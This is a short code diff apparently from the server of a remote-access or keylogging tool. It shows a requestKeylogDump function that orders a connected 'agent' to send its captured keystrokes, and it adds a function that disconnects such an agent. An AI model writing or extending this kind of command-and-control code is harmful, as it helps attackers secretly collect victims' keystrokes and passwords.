@@ -1,4 +1,4 @@
-#include "../include/server.hpp"
+#include "../../include/network/server.hpp"
 #include <iostream>
 #include <algorithm> // To use std::remove_if
 #include <iomanip>
@@ -244,6 +244,17 @@ void Server::requestKeylogDump(const QString& ip) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
             Packet p(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
             client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::disconnectAgent(const QString& ip) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            if (client.socket.isValid()) {
+                ::shutdown(client.socket.getFd(), SHUT_RDWR);
+            }
             break;
         }
     }
